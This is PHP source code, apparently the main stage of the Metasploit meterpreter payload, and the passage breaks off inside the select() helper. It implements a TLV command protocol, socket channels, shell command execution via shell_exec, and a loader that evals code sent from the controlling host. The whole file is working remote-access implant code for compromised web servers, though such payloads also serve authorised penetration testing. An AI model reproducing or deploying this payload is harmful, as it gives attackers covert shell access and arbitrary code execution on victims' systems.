#<?php

# Everything that needs to be global has to be made so explicitly so we can run
# inside a call to create_user_func($user_input);

# global list of channels
if (!isset($GLOBALS['channels'])) {
    $GLOBALS['channels'] = array();
}

# global mapping of channels to channelized processes.  This is how we know
# if we need to kill a process when it's channel has been closed.
if (!isset($GLOBALS['channel_process_map'])) {
    $GLOBALS['channel_process_map'] = array();
}

# global resource map.  This is how we know whether to use socket or stream
# functions on a channel.
if (!isset($GLOBALS['resource_type_map'])) {
    $GLOBALS['resource_type_map'] = array();
}

# global map of sockets to the associated peer host.
if (!isset($GLOBALS['udp_host_map'])) {
    $GLOBALS['udp_host_map'] = array();
}

# global list of resources we need to watch in the main select loop
if (!isset($GLOBALS['readers'])) {
    $GLOBALS['readers'] = array();
}

# global list of extension commands
if (!isset($GLOBALS['commands'])) {
    $GLOBALS['commands'] = array("core_loadlib");
}

function register_command($c) {
    global $commands;
    if (! in_array($c, $commands)) {
        array_push($commands, $c);
    }
}

function my_print($str) {
    #error_log($str);
}

my_print("Evaling main meterpreter stage");

# Be very careful not to put a # anywhere that isn't a comment (e.g. inside a
# string) as the comment remover will completely break this payload

function dump_array($arr, $name=null) {
    if (is_null($name)) {
        $name = "Array";
    }
    my_print(sprintf("$name (%s)", count($arr)));
    foreach ($arr as $key => $val) {
        if (is_array($val)) {
            # recurse
            dump_array($val, "{$name}[{$key}]");
        } else {
            my_print(sprintf("    $key ($val)"));
        }
    }
}
function dump_readers() {
    global $readers;
    dump_array($readers, 'Readers');
}
function dump_resource_map() {
    global $resource_type_map;
    dump_array($resource_type_map, 'Resource map');
}
function dump_channels($extra="") {
    global $channels;
    dump_array($channels, 'Channels '.$extra);
}


# Doesn't exist before php 4.3
if (!function_exists("file_get_contents")) {
function file_get_contents($file) {
    $f = @fopen($file,"rb");
    $contents = false;
    if ($f) {
        do { $contents .= fgets($f); } while (!feof($f));
    }
    fclose($f);
    return $contents;
}
}

# Renamed in php 4.3
if (!function_exists('socket_set_option')) {
function socket_set_option($sock, $type, $opt, $value) {
    socket_setopt($sock, $type, $opt, $value);
}
}


#
# Constants
#
define("PACKET_TYPE_REQUEST",0);
define("PACKET_TYPE_RESPONSE",1);
define("PACKET_TYPE_PLAIN_REQUEST", 10);
define("PACKET_TYPE_PLAIN_RESPONSE", 11);

define("ERROR_SUCCESS",0);
# not defined in original C implementation
define("ERROR_FAILURE",1);

define("CHANNEL_CLASS_BUFFERED", 0);
define("CHANNEL_CLASS_STREAM",   1);
define("CHANNEL_CLASS_DATAGRAM", 2);
define("CHANNEL_CLASS_POOL",     3);

#
# TLV Meta Types
#
define("TLV_META_TYPE_NONE",       (   0   ));
define("TLV_META_TYPE_STRING",     (1 << 16));
define("TLV_META_TYPE_UINT",       (1 << 17));
define("TLV_META_TYPE_RAW",        (1 << 18));
define("TLV_META_TYPE_BOOL",       (1 << 19));
define("TLV_META_TYPE_COMPRESSED", (1 << 29));
define("TLV_META_TYPE_GROUP",      (1 << 30));
define("TLV_META_TYPE_COMPLEX",    (1 << 31));
# not defined in original
define("TLV_META_TYPE_MASK",    (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16));

#
# TLV base starting points
#
define("TLV_RESERVED",   0);
define("TLV_EXTENSIONS", 20000);
define("TLV_USER",       40000);
define("TLV_TEMP",       60000);

#
# TLV Specific Types
#
define("TLV_TYPE_ANY",                 TLV_META_TYPE_NONE   |   0);
define("TLV_TYPE_METHOD",              TLV_META_TYPE_STRING |   1);
define("TLV_TYPE_REQUEST_ID",          TLV_META_TYPE_STRING |   2);
define("TLV_TYPE_EXCEPTION",           TLV_META_TYPE_GROUP  |   3);
define("TLV_TYPE_RESULT",              TLV_META_TYPE_UINT   |   4);

define("TLV_TYPE_STRING",              TLV_META_TYPE_STRING |  10);
define("TLV_TYPE_UINT",                TLV_META_TYPE_UINT   |  11);
define("TLV_TYPE_BOOL",                TLV_META_TYPE_BOOL   |  12);

define("TLV_TYPE_LENGTH",              TLV_META_TYPE_UINT   |  25);
define("TLV_TYPE_DATA",                TLV_META_TYPE_RAW    |  26);
define("TLV_TYPE_FLAGS",               TLV_META_TYPE_UINT   |  27);

define("TLV_TYPE_CHANNEL_ID",          TLV_META_TYPE_UINT   |  50);
define("TLV_TYPE_CHANNEL_TYPE",        TLV_META_TYPE_STRING |  51);
define("TLV_TYPE_CHANNEL_DATA",        TLV_META_TYPE_RAW    |  52);
define("TLV_TYPE_CHANNEL_DATA_GROUP",  TLV_META_TYPE_GROUP  |  53);
define("TLV_TYPE_CHANNEL_CLASS",       TLV_META_TYPE_UINT   |  54);

define("TLV_TYPE_SEEK_WHENCE",         TLV_META_TYPE_UINT   |  70);
define("TLV_TYPE_SEEK_OFFSET",         TLV_META_TYPE_UINT   |  71);
define("TLV_TYPE_SEEK_POS",            TLV_META_TYPE_UINT   |  72);

define("TLV_TYPE_EXCEPTION_CODE",      TLV_META_TYPE_UINT   | 300);
define("TLV_TYPE_EXCEPTION_STRING",    TLV_META_TYPE_STRING | 301);

define("TLV_TYPE_LIBRARY_PATH",        TLV_META_TYPE_STRING | 400);
define("TLV_TYPE_TARGET_PATH",         TLV_META_TYPE_STRING | 401);
define("TLV_TYPE_MIGRATE_PID",         TLV_META_TYPE_UINT   | 402);
define("TLV_TYPE_MIGRATE_LEN",         TLV_META_TYPE_UINT   | 403);

define("TLV_TYPE_CIPHER_NAME",         TLV_META_TYPE_STRING | 500);
define("TLV_TYPE_CIPHER_PARAMETERS",   TLV_META_TYPE_GROUP  | 501);

function my_cmd($cmd) {
    return shell_exec($cmd);
}

function is_windows() {
    return (strtoupper(substr(PHP_OS,0,3)) == "WIN");
}



##
# Worker functions
##

function core_channel_open($req, &$pkt) {
    $type_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_TYPE);

    my_print("Client wants a ". $type_tlv['value'] ." channel, i'll see what i can do");

    # Doing it this way allows extensions to create new channel types without
    # needing to modify the core code.
    $handler = "channel_create_". $type_tlv['value'];
    if ($type_tlv['value'] && is_callable($handler)) {
        my_print("Calling {$handler}");
        $ret = $handler($req, $pkt);
    } else {
        my_print("I don't know how to make a ". $type_tlv['value'] ." channel. =(");
        $ret = ERROR_FAILURE;
    }

    return $ret;
}

# Works for streams
function core_channel_eof($req, &$pkt) {
    my_print("doing channel eof");
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $c = get_channel_by_id($chan_tlv['value']);

    if ($c) {
        if (eof($c[1])) {
            packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 1));
        } else {
            packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 0));
        }
        return ERROR_SUCCESS;
    } else {
        return ERROR_FAILURE;
    }
}

# Works
function core_channel_read($req, &$pkt) {
    my_print("doing channel read");
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $len_tlv = packet_get_tlv($req, TLV_TYPE_LENGTH);
    $id = $chan_tlv['value'];
    $len = $len_tlv['value'];
    $data = channel_read($id, $len);
    if ($data === false) {
        $res = ERROR_FAILURE;
    } else {
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_DATA, $data));
        $res = ERROR_SUCCESS;
    }
    return $res;
}

# Works
function core_channel_write($req, &$pkt) {
    #my_print("doing channel write");
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $data_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_DATA);
    $len_tlv = packet_get_tlv($req, TLV_TYPE_LENGTH);
    $id = $chan_tlv['value'];
    $data = $data_tlv['value'];
    $len = $len_tlv['value'];

    $wrote = channel_write($id, $data, $len);
    if ($wrote === false) {
        return ERROR_FAILURE;
    } else {
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_LENGTH, $wrote));
        return ERROR_SUCCESS;
    }
}

#
# This is called when the client wants to close a channel explicitly.  Not to be confused with
#
function core_channel_close($req, &$pkt) {
    global $channel_process_map;
    # XXX remove the closed channel from $readers
    my_print("doing channel close");
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $id = $chan_tlv['value'];

    $c = get_channel_by_id($id);
    if ($c) {
        # We found a channel, close its stdin/stdout/stderr
        channel_close_handles($id);

        # This is an explicit close from the client, always remove it from the
        # list, even if it has data.
        channel_remove($id);

        # if the channel we're closing is associated with a process, kill the
        # process
        # Make sure the stdapi function for closing a process handle is
        # available before trying to clean up
        if (array_key_exists($id, $channel_process_map) and is_callable('close_process')) {
            close_process($channel_process_map[$id]);
        }
        return ERROR_SUCCESS;
    }
    dump_channels("after close");

    return ERROR_FAILURE;
}

#
# Destroy a channel and all associated handles.
#
function channel_close_handles($cid) {
    global $channels;

    # Sanity check - make sure a channel with the given cid exists
    if (!array_key_exists($cid, $channels)) {
        return;
    }
    $c = $channels[$cid];
    for($i = 0; $i < 3; $i++) {
        #my_print("closing channel fd $i, {$c[$i]}");
        if (array_key_exists($i, $c) && is_resource($c[$i])) {
            close($c[$i]);
            # Make sure the main loop doesn't select on this resource after we
            # close it.
            remove_reader($c[$i]);
        }
    }

    # axe it from the list only if it doesn't have any leftover data
    if (strlen($c['data']) == 0) {
        channel_remove($cid);
    }
}

function channel_remove($cid) {
    global $channels;
    unset($channels[$cid]);
}

function core_channel_interact($req, &$pkt) {
    global $readers;

    my_print("doing channel interact");
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $id = $chan_tlv['value'];

    # True means start interacting, False means stop
    $toggle_tlv = packet_get_tlv($req, TLV_TYPE_BOOL);

    $c = get_channel_by_id($id);
    if ($c) {
        if ($toggle_tlv['value']) {
            # Start interacting.  If we're already interacting with this
            # channel, it's an error and we should return failure.
            if (!in_array($c[1], $readers)) {
                # stdout
                add_reader($c[1]);
                # Make sure we don't add the same resource twice in the case
                # that stdin == stderr
                if (array_key_exists(2, $c) && $c[1] != $c[2]) {
                    # stderr
                    add_reader($c[2]);
                }
                $ret = ERROR_SUCCESS;
            } else {
                # Already interacting
                $ret = ERROR_FAILURE;
            }
        } else {
            # Stop interacting.  If we're not interacting yet with this
            # channel, it's an error and we should return failure.
            if (in_array($c[1], $readers)) {
                remove_reader($c[1]); # stdout
                remove_reader($c[2]); # stderr
                $ret = ERROR_SUCCESS;
            } else {
                # Not interacting.  This is technically failure, but it seems
                # the client sends us two of these requests in quick succession
                # causing the second one to always return failure.  When that
                # happens we fail to clean up properly, so always return
                # success here.
                $ret = ERROR_SUCCESS;
            }
        }
    } else {
        # Not a valid channel
        my_print("Trying to interact with an invalid channel");
        $ret = ERROR_FAILURE;
    }
    return $ret;
}

function interacting($cid) {
    global $readers;
    $c = get_channel_by_id($cid);
    if (in_array($c[1], $readers)) {
        return true;
    }
    return false;
}


function core_shutdown($req, &$pkt) {
    my_print("doing core shutdown");
    die();
}

# zlib support is not compiled in by default, so this makes sure the library
# isn't compressed before eval'ing it
# TODO: check for zlib support and decompress if possible
function core_loadlib($req, &$pkt) {
    global $commands;
    my_print("doing core_loadlib");
    $data_tlv = packet_get_tlv($req, TLV_TYPE_DATA);
    if (($data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED) {
        return ERROR_FAILURE;
    }
    $tmp = $commands;
    eval($data_tlv['value']);
    $new = array_diff($commands, $tmp);
    foreach ($new as $meth) {
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, $meth));
    }

    return ERROR_SUCCESS;
}






##
# Channel Helper Functions
##
$channels = array();

function register_channel($in, $out=null, $err=null) {
    global $channels;
    if ($out == null) { $out = $in; }
    if ($err == null) { $err = $out; }
    $channels[] = array(0 => $in, 1 => $out, 2 => $err, 'type' => get_rtype($in), 'data' => '');

    # Grab the last index and use it as the new ID.
    $id = end(array_keys($channels));
    my_print("Created new channel $in, with id $id");
    return $id;
}

#
# Channels look like this:
#
# Array
# (
#   [0] => Array
#       (
#            [0] => Resource id #12
#            [1] => Resource id #13
#            [2] => Resource id #14
#            [type] => 'stream'
#            [data] => '...'
#       )
# )
#
function get_channel_id_from_resource($resource) {
    global $channels;
    if (empty($channels)) {
        return false;
    }
    foreach ($channels as $i => $chan_ary) {
        if (in_array($resource, $chan_ary)) {
            my_print("Found channel id $i");
            return $i;
        }
    }
    return false;
}

function get_channel_by_id($chan_id) {
    global $channels;
    my_print("Looking up channel id $chan_id");
    #dump_channels("in get_channel_by_id");
    if (array_key_exists($chan_id, $channels)) {
        my_print("Found one");
        return $channels[$chan_id];
    } else {
        return false;
    }
}

# Write data to the channel's stdin
function channel_write($chan_id, $data) {
    $c = get_channel_by_id($chan_id);
    if ($c && is_resource($c[0])) {
        my_print("---Writing '$data' to channel $chan_id");
        return write($c[0], $data);
    } else {
        return false;
    }
}

# Read from the channel's stdout
function channel_read($chan_id, $len) {
    $c = get_channel_by_id($chan_id);
    if ($c) {
        # First get any pending unread data from a previous read
        $ret = substr($c['data'], 0, $len);
        $c['data'] = substr($c['data'], $len);
        if (strlen($ret) > 0) { my_print("Had some leftovers: '$ret'"); }

        # Next grab stderr if we have it and it's not the same file descriptor
        # as stdout.
        if (strlen($ret) < $len and is_resource($c[2]) and $c[1] != $c[2]) {
            # Read as much as possible into the channel's data buffer
            $read = read($c[2]);
            $c['data'] .= $read;

            # Now slice out however much the client asked for.  If there's any
            # left over, they'll get it next time.  If it doesn't add up to
            # what they requested, oh well, they'll just have to call read
            # again. Looping until we get the requested number of bytes is
            # inconsistent with win32 meterpreter and causes the whole php
            # process to block waiting on input.
            $bytes_needed = $len - strlen($ret);
            $ret .= substr($c['data'], 0, $bytes_needed);
            $c['data'] = substr($c['data'], $bytes_needed);
        }

        # Then if there's still room, grab stdout
        if (strlen($ret) < $len and is_resource($c[1])) {
            # Same as above, but for stdout.  This will overwrite a false
            # return value from reading stderr but the two should generally
            # EOF at the same time, so it should be fine.
            $read = read($c[1]);
            $c['data'] .= $read;
            $bytes_needed = $len - strlen($ret);
            $ret .= substr($c['data'], 0, $bytes_needed);
            $c['data'] = substr($c['data'], $bytes_needed);
        }

        # In the event of one or the other of the above read()s returning
        # false, make sure we have sent any pending unread data before saying
        # EOF by returning false.  Note that if they didn't return false, it is
        # perfectly legitimate to return an empty string which just means
        # there's no data right now but we haven't hit EOF yet.
        if (false === $read and empty($ret)) {
            if (interacting($chan_id)) {
                handle_dead_resource_channel($c[1]);
            }
            return false;
        }
        return $ret;
    } else {
        return false;
    }
}




##
# TLV Helper Functions
##

function generate_req_id() {
    $characters = 'abcdefghijklmnopqrstuvwxyz';
    $rid = '';

    for ($p = 0; $p < 32; $p++) {
        $rid .= $characters[rand(0, strlen($characters)-1)];
    }

    return $rid;
}

function handle_dead_resource_channel($resource) {
    global $msgsock;

    if (!is_resource($resource)) {
        return;
    }

    $cid = get_channel_id_from_resource($resource);
    if ($cid === false) {
        my_print("Resource has no channel: {$resource}");

        # Make sure the provided resource gets closed regardless of it's status
        # as a channel
        remove_reader($resource);
        close($resource);
    } else {
        my_print("Handling dead resource: {$resource}, for channel: {$cid}");

        # Make sure we close other handles associated with this channel as well
        channel_close_handles($cid);

        # Notify the client that this channel is dead
        $pkt = pack("N", PACKET_TYPE_REQUEST);
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_close'));
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, generate_req_id()));
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));
        # Add the length to the beginning of the packet
        $pkt = pack("N", strlen($pkt) + 4) . $pkt;
        write($msgsock, $pkt);
    }

    return;
}

function handle_resource_read_channel($resource, $data) {
    global $udp_host_map;
    $cid = get_channel_id_from_resource($resource);
    my_print("Handling data from $resource");

    # Build a new Packet
    $pkt = pack("N", PACKET_TYPE_REQUEST);
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_write'));
    if (array_key_exists((int)$resource, $udp_host_map)) {
        list($h,$p) = $udp_host_map[(int)$resource];
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_PEER_HOST, $h));
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_PEER_PORT, $p));
    }
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_DATA, $data));
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_LENGTH, strlen($data)));
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, generate_req_id()));

    # Add the length to the beginning of the packet
    $pkt = pack("N", strlen($pkt) + 4) . $pkt;
    return $pkt;
}

function create_response($req) {
    $pkt = pack("N", PACKET_TYPE_RESPONSE);

    $method_tlv = packet_get_tlv($req, TLV_TYPE_METHOD);
    my_print("method is {$method_tlv['value']}");
    packet_add_tlv($pkt, $method_tlv);

    $reqid_tlv = packet_get_tlv($req, TLV_TYPE_REQUEST_ID);
    packet_add_tlv($pkt, $reqid_tlv);

    if (is_callable($method_tlv['value'])) {
        $result = $method_tlv['value']($req, $pkt);
    } else {
        my_print("Got a request for something I don't know how to handle (". $method_tlv['value'] ."), returning failure");
        $result = ERROR_FAILURE;
    }

    packet_add_tlv($pkt, create_tlv(TLV_TYPE_RESULT, $result));
    # Add the length to the beginning of the packet
    $pkt = pack("N", strlen($pkt) + 4) . $pkt;
    return $pkt;
}

function create_tlv($type, $val) {
    return array( 'type' => $type, 'value' => $val );
}

function tlv_pack($tlv) {
    $ret = "";
    #my_print("Creating a tlv of type: {$tlv['type']}");
    if (($tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
        $ret = pack("NNa*", 8 + strlen($tlv['value'])+1, $tlv['type'], $tlv['value'] . "\0");
    }
    elseif (($tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) {
        $ret = pack("NNN", 8 + 4, $tlv['type'], $tlv['value']);
    }
    elseif (($tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) {
        # PHP's pack appears to be busted for chars,
        $ret = pack("NN", 8 + 1, $tlv['type']);
        $ret .= $tlv['value'] ? "\x01" : "\x00";
    }
    elseif (($tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW) {
        $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
    }
    elseif (($tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP) {
        # treat groups the same as raw
        $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
    }
    elseif (($tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX) {
        # treat complex the same as raw
        $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
    }
    else {
        my_print("Don't know how to make a tlv of type ". $tlv['type'] .  " (meta type ". sprintf("%08x", $tlv['type'] & TLV_META_TYPE_MASK) ."), wtf");
    }
    return $ret;
}

function packet_add_tlv(&$pkt, $tlv) {
    $pkt .= tlv_pack($tlv);
}

function packet_get_tlv($pkt, $type) {
    #my_print("Looking for a tlv of type $type");
    # Start at offset 8 to skip past the packet header
    $offset = 8;
    while ($offset < strlen($pkt)) {
        $tlv = unpack("Nlen/Ntype", substr($pkt, $offset, 8));
        #my_print("len: {$tlv['len']}, type: {$tlv['type']}");
        if ($type == ($tlv['type'] & ~TLV_META_TYPE_COMPRESSED)) {
            #my_print("Found one at offset $offset");
            if (($type & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
                $tlv = unpack("Nlen/Ntype/a*value", substr($pkt, $offset, $tlv['len']));
            }
            elseif (($type & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) {
                $tlv = unpack("Nlen/Ntype/Nvalue", substr($pkt, $offset, $tlv['len']));
            }
            elseif (($type & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) {
                $tlv = unpack("Nlen/Ntype/cvalue", substr($pkt, $offset, $tlv['len']));
            }
            elseif (($type & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW) {
                $tlv = unpack("Nlen/Ntype", substr($pkt, $offset, 8));
                $tlv['value'] = substr($pkt, $offset+8, $tlv['len']-8);
            }
            else {
                my_print("Wtf type is this? $type");
                $tlv = null;
            }
            return $tlv;
        }
        $offset += $tlv['len'];
    }
    #my_print("Didn't find one, wtf");
    return false;
}


##
# Functions for genericizing the stream/socket conundrum
##


function register_socket($sock, $ipaddr=null, $port=null) {
    global $resource_type_map, $udp_host_map;
    my_print("Registering socket $sock for ($ipaddr:$port)");
    $resource_type_map[(int)$sock] = 'socket';
    if ($ipaddr) {
        $udp_host_map[(int)$sock] = array($ipaddr, $port);
        #dump_array($udp_host_map, "UDP Map after registering a new socket");
    }
}

# The stream functions cannot be unconnected, so don't require a host map
function register_stream($stream, $ipaddr=null, $port=null) {
    global $resource_type_map, $udp_host_map;
    my_print("Registering stream $stream for ($ipaddr:$port)");
    $resource_type_map[(int)$stream] = 'stream';
    if ($ipaddr) {
        $udp_host_map[(int)$stream] = array($ipaddr, $port);
        #dump_array($udp_host_map, "UDP Map after registering a new stream");
    }
}

function connect($ipaddr, $port, $proto='tcp') {
    my_print("Doing connect($ipaddr, $port)");
    $sock = false;

    # IPv6 requires brackets around the address in some cases, but not all.
    # Keep track of the un-bracketed address for the functions that don't like
    # brackets, specifically socket_connect and socket_sendto.
    $ipf = AF_INET;
    $raw_ip = $ipaddr;
    if (FALSE !== strpos($ipaddr, ":")) {
        $ipf = AF_INET6;
        $ipaddr = "[". $raw_ip ."]";
    }

    # Prefer the stream versions so we don't have to use both select functions
    # unnecessarily, but fall back to socket_create if they aren't available.
    if (is_callable('stream_socket_client')) {
        my_print("stream_socket_client({$proto}://{$ipaddr}:{$port})");
        $sock = stream_socket_client("{$proto}://{$ipaddr}:{$port}");
        my_print("Got a sock: $sock");
        if (!$sock) { return false; }
        if ($proto == 'tcp') {
            register_stream($sock);
        } elseif ($proto == 'udp') {
            register_stream($sock, $ipaddr, $port);
        } else {
            my_print("WTF proto is this: '$proto'");
        }
    } else
    if (is_callable('fsockopen')) {
        my_print("fsockopen");
        if ($proto == 'tcp') {
            $sock = fsockopen($ipaddr,$port);
            if (!$sock) { return false; }
            if (is_callable('socket_set_timeout')) {
                socket_set_timeout($sock, 2);
            }
            register_stream($sock);
        } else {
            $sock = fsockopen($proto."://".$ipaddr,$port);
            if (!$sock) { return false; }
            register_stream($sock, $ipaddr, $port);
        }
    } else
    if (is_callable('socket_create')) {
        my_print("socket_create");
        if ($proto == 'tcp') {
            $sock = socket_create($ipf, SOCK_STREAM, SOL_TCP);
            $res = socket_connect($sock, $raw_ip, $port);
            if (!$res) { return false; }
            register_socket($sock);
        } elseif ($proto == 'udp') {
            $sock = socket_create($ipf, SOCK_DGRAM, SOL_UDP);
            register_socket($sock, $raw_ip, $port);
        }
    }

    return $sock;
}

function eof($resource) {
    $ret = false;
    switch (get_rtype($resource)) {
    # XXX Doesn't work with sockets.
    case 'socket': break;
    case 'stream':
        # We set the socket timeout for streams opened with fsockopen() when
        # they are created. I hope this is enough to deal with hangs when
        # calling feof() on socket streams, but who knows. This is PHP,
        # anything could happen. Some day they'll probably add a new function
        # called stream_eof() and it will handle sockets properly except for
        # some edge case that happens for every socket except the one or two
        # they tested it on and it will always return false on windows and
        # later they'll rename it to real_stream_eof_this_language_isretarded().
        #
        # See http://us2.php.net/manual/en/function.feof.php , specifically this:
        #   If a connection opened by fsockopen() wasn't closed by the server,
        #   feof() will hang. To workaround this, see below example:
        #     <?php
        #     function safe_feof($fp, &$start = NULL) {
        #     ...
        $ret = feof($resource);
        break;
    }
    return $ret;
}

function close($resource) {
    my_print("Closing resource $resource");
    global $resource_type_map, $udp_host_map;

    remove_reader($resource);
    switch (get_rtype($resource)) {
    case 'socket': $ret = socket_close($resource); break;
    case 'stream': $ret = fclose($resource); break;
    }
    # Every resource should be in the resource type map, but check anyway
    if (array_key_exists((int)$resource, $resource_type_map)) {
        unset($resource_type_map[(int)$resource]);
    }
    if (array_key_exists((int)$resource, $udp_host_map)) {
        my_print("Removing $resource from udp_host_map");
        unset($udp_host_map[(int)$resource]);
    }
    return $ret;
}

function read($resource, $len=null) {
    global $udp_host_map;
    # Max packet length is magic.  If we're reading a pipe that has data but
    # isn't going to generate any more without some input, then reading less
    # than all bytes in the buffer or 8192 bytes, the next read will never
    # return.
    if (is_null($len)) { $len = 8192; }
    #my_print(sprintf("Reading from $resource which is a %s", get_rtype($resource)));
    $buff = '';
    switch (get_rtype($resource)) {
    case 'socket':
        if (array_key_exists((int)$resource, $udp_host_map)) {
            my_print("Reading UDP socket");
            list($host,$port) = $udp_host_map[(int)$resource];
            socket_recvfrom($resource, $buff, $len, PHP_BINARY_READ, $host, $port);
        } else {
            my_print("Reading TCP socket");
            $buff .= socket_read($resource, $len, PHP_BINARY_READ);
        }
        break;
    case 'stream':
        global $msgsock;
        # Calling select here should ensure that we never try to read from a socket
        # or pipe that doesn't currently have data.  If that ever happens, the
        # whole php process will block waiting for data that may never come.
        # Unfortunately, selecting on pipes created with proc_open on Windows
        # always returns immediately.  Basically, shell interaction in Windows
        # is hosed until this gets figured out.  See https://dev.metasploit.com/redmine/issues/2232
        $r = Array($resource);
        my_print("Calling select to see if there's data on $resource");
        while (true) {
            $cnt = stream_select($r, $w=NULL, $e=NULL, 0);

            # Stream is not ready to read, have to live with what we've gotten
            # so far
            if ($cnt === 0) {
                break;
            }

            # if stream_select returned false, something is wrong with the
            # socket or the syscall was interrupted or something.
            if ($cnt === false or feof($resource)) {
                my_print("Checking for failed read...");
                if (empty($buff)) {
                    my_print("----  EOF ON $resource  ----");
                    $buff = false;
                }
                break;
            }

            $md = stream_get_meta_data($resource);
            dump_array($md);
            if ($md['unread_bytes'] > 0) {
                $buff .= fread($resource, $md['unread_bytes']);
                break;
            } else {
                #$len = 1;
                $tmp = fread($resource, $len);
                $buff .= $tmp;
                if (strlen($tmp) < $len) {
                    break;
                }
            }

            if ($resource != $msgsock) { my_print("buff: '$buff'"); }
            $r = Array($resource);
        }
        my_print(sprintf("Done with the big read loop on $resource, got %d bytes", strlen($buff)));
        break;
    default:
        # then this is possibly a closed channel resource, see if we have any
        # data from previous reads
        $cid = get_channel_id_from_resource($resource);
        $c = get_channel_by_id($cid);
        if ($c and $c['data']) {
            $buff = substr($c['data'], 0, $len);
            $c['data'] = substr($c['data'], $len);
            my_print("Aha!  got some leftovers");
        } else {
            my_print("Wtf don't know how to read from resource $resource, c: $c");
            if (is_array($c)) {
                dump_array($c);
            }
            break;
        }
    }
    my_print(sprintf("Read %d bytes", strlen($buff)));
    return $buff;
}

function write($resource, $buff, $len=0) {
    global $udp_host_map;
    if ($len == 0) { $len = strlen($buff); }
    #my_print(sprintf("Writing $len bytes to $resource which is a %s", get_rtype($resource)));
    $count = false;
    switch (get_rtype($resource)) {
    case 'socket':
        if (array_key_exists((int)$resource, $udp_host_map)) {
            my_print("Writing UDP socket");
            list($host,$port) = $udp_host_map[(int)$resource];
            $count = socket_sendto($resource, $buff, $len, $host, $port);
        } else {
            $count = socket_write($resource, $buff, $len);
        }
        break;
    case 'stream':
        $count = fwrite($resource, $buff, $len);
        fflush($resource);
        break;
    default: my_print("Wtf don't know how to write to resource $resource"); break;
    }
    return $count;
}

function get_rtype($resource) {
    global $resource_type_map;
    if (array_key_exists((int)$resource, $resource_type_map)) {
        return $resource_type_map[(int)$resource];
    }
    return false;
}

function select(&$r, &$w, &$e, $tv_sec=0, $tv_usec=0) {
    $streams_r = array();
    $streams_w = array();
    $streams_e = array();

    $sockets_r = array();
    $sockets_w = array();
    $sockets_e = array();

    if ($r) {
        foreach ($r as $resource) {
            switch (get_rtype($resource)) {
            case 'socket': $sockets_r[] = $resource; break;
            case 'stream': $streams_r[] = $resource; break;
            default: my_print("Unknown resource type"); break;
            }
        }
    }
    if ($w) {
        foreach ($w as $resource) {
            switch (get_rtype($resource)) {
            case 'socket': $sockets_w[] = $resource; break;
            case 'stream': $streams_w[] = $resource; break;
            default: my_print("Unknown resource type"); break;
            }
        }
    }
    if ($e) {
        foreach ($e as $resource) {
            switch (get_rtype($resource)) {
            case 'socket': $sockets_e[] = $resource; break;
            case 'stream': $streams_e[] = $resource; break;
            default: my_print("Unknown resource type"); break;
            }
        }
    }

    $n_sockets = count($sockets_r) + count($sockets_w) + count($sockets_e);
    $n_streams = count($streams_r) + count($streams_w) + count($streams_e);
    #my_print("Selecting $n_sockets sockets and $n_streams streams with timeout $tv_sec.$tv_usec");
    $r = array();
    $w = array();
    $e = array();

    # Workaround for some versions of PHP that throw an error and bail out if
    # select is given an empty array
    if (count($sockets_r)==0) { $sockets_r = null; }
    if (count($sockets_w)==0) { $sockets_w = null; }
    if (count($sockets_e)==0) { $sockets_e = null; }
    if (count($streams_r)==0) { $streams_r = null; }
    if (count($streams_w)==0) { $streams_w = null; }
    if (count($streams_e)==0) { $streams_e = null; }

    $count = 0;
    if ($n_sockets > 0) {
        $res = socket_select($sockets_r, $sockets_w, $sockets_e, $tv_sec, $tv_usec);
        if (false === $res) { return false; }
        if (is_array($r) && is_array($sockets_r)) { $r = array_merge($r, $sockets_r); }
        if (is_array($w) && is_array($sockets_w)) { $w = array_merge($w, $sockets_w); }
        if (is_array($e) && is_array($sockets_e)) { $e = array_merge($e, $sockets_e); }
        $count += $res;
    }
    if ($n_streams > 0) {
        $res = stream_select($streams_r, $streams_w, $streams_e, $tv_sec, $tv_usec);
        if (false === $res) { return false; }
        if (is_array($r) && is_array($streams_r)) { $r = array_merge($r, $streams_r); }
        if (is_array($w) && is_array($streams_w)) { $w = array_merge($w, $streams_w); }
